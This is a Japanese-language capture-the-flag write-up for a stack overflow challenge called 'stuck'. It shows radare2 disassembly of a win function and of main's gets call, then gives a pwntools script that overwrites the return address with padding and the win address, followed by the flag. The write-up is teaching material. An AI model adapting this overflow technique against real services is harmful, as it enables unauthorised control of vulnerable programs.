# stuck writeup

## 問題文

```txt
I'm full stuck engineer.

nc 203.0.113.0 4000
```

## about

stuck overflowによってmainのリターンアドレスを書き換える問題です．

## writeup

radare2で見ると，`afl`の結果から`win`関数が定義されている事がわかり，その内容から，`win`を呼び出すことでflagが読める事に気付けます．

```txt
[0x004010f0]> afl|grep win
0x004011d6    1 49           sym.win
```

```txt
[0x004010f0]> pdf @sym.win
┌ 49: sym.win ();
│           0x004011d6      f30f1efa       endbr64
│           0x004011da      55             push rbp
│           0x004011db      4889e5         mov rbp, rsp
│           0x004011de      488d15230e00.  lea rdx, str.flag.txt       ; 0x402008 ; "flag.txt"
│           0x004011e5      488d35250e00.  lea rsi, [0x00402011]       ; "cat"
│           0x004011ec      488d3d220e00.  lea rdi, str.bin_cat        ; 0x402015 ; "/bin/cat"
│           0x004011f3      b800000000     mov eax, 0
│           0x004011f8      e8e3feffff     call sym.imp.execl
│           0x004011fd      bf00000000     mov edi, 0                  ; int status
└           0x00401202      e8c9feffff     call sym.imp.exit           ; void exit(int status)
```

`main`関数を読むと，`gets`の引数が`rbp-0x70`にあり，スタックフレームのサイズと等しい事がわかります．

```txt
[0x004010f0]> pdf @main
            ; DATA XREF from entry0 @ 0x401111
┌ 77: int main (int argc, char **argv, char **envp);
│           ; var char *s @ rbp-0x70
│           0x00401207      f30f1efa       endbr64
│           0x0040120b      55             push rbp
│           0x0040120c      4889e5         mov rbp, rsp
│           0x0040120f      4883ec70       sub rsp, 0x70
│           0x00401213      488d3d040e00.  lea rdi, str.What_s_your_name ; 0x40201e ; "What's your name?\n> " ; const char *format
│           0x0040121a      b800000000     mov eax, 0
│           0x0040121f      e86cfeffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00401224      488d4590       lea rax, [s]
│           0x00401228      4889c7         mov rdi, rax                ; char *s
│           0x0040122b      b800000000     mov eax, 0
│           0x00401230      e87bfeffff     call sym.imp.gets           ; char *gets(char *s)
```

つまり，`gets`に0x78バイトのデータと適切(リトルエンディアン，64bit)に加工した`win`関数のアドレスを送るとflagが読めます．

```python3
#!/usr/bin/env python3
from pwn import *
binfile = './chall'
e = ELF(binfile)
context.binary = binfile

io = remote('203.0.113.0', 4000)

payload = b'a' * 0x78 + pack(e.sym['win'])

io.sendline(payload)
io.interactive()
```

## flag

`ISCCTF{Y0u_kn0w_5t4ck_0v3rfl0w}`
